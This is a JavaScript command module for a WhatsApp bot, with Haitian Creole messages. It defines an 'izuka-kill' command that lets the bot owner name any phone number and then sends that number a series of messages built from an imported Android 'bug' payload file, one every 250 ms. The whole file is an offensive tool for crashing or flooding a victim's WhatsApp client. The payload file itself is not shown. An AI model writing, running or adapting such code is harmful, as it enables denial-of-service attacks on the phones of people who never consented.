const bugchat = require('../../bug/izuka6.js'); // Payload Android
const config = require('../../config');
const { cmd } = require('../command');

cmd({
  pattern: 'izuka-kill',
  desc: 'Lanse yon bug sou Android (DM)',
  category: 'bug',
  filename: __filename
}, async (m, Matrix) => {
  const prefix = config.PREFIX;
  const cmdName = m.body.startsWith(prefix)
    ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
    : '';

  if (cmdName !== 'izuka-kill') return;

  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const senderId = m.sender;
  const isSudo = [
    botNumber,
    config.OWNER_NUMBER + '@s.whatsapp.net',
    ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
  ].includes(senderId);

  if (!isSudo) {
    return await Matrix.sendMessage(m.from, {
      text: '*❌ OU PA OTORIZE POU SA!*',
    }, { quoted: m });
  }

  const args = m.body.trim().split(' ').slice(1);
  const targetNumber = args[0];

  if (!targetNumber || isNaN(targetNumber)) {
    return await Matrix.sendMessage(m.from, {
      text: '*🧨 Sèvi ak:*\n.izuka-kill 509XXXXXXXX',
    }, { quoted: m });
  }

  const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
  const protected = [config.OWNER_NUMBER, ...(config.SUDO || [])];
  if (protected.includes(cleanNumber)) {
    return await Matrix.sendMessage(m.from, {
      text: '*🛡️ Nimewo sa pwoteje pa bot la.*',
    }, { quoted: m });
  }

  const targetJid = `${cleanNumber}@s.whatsapp.net`;
  const attackLines = bugchat.split('\n').filter(Boolean);

  await Matrix.sendMessage(m.from, {
    text: `💣 *IZUKA-KILL ANDROID* lanse sou: +${cleanNumber}\n⏳ Tanpri tann...`,
  }, { quoted: m });

  for (let i = 0; i < attackLines.length; i++) {
    await Matrix.sendMessage(targetJid, {
      text: `💥 *IZUKA-KILL ${i + 1}*\n${attackLines[i]}\n\n_By Dawens Boy_`,
    });
    await new Promise(r => setTimeout(r, 250));
  }

  await Matrix.sendMessage(m.from, {
    text: `✅ *IZUKA-KILL fini* sou +${cleanNumber}`,
  }, { quoted: m });
});
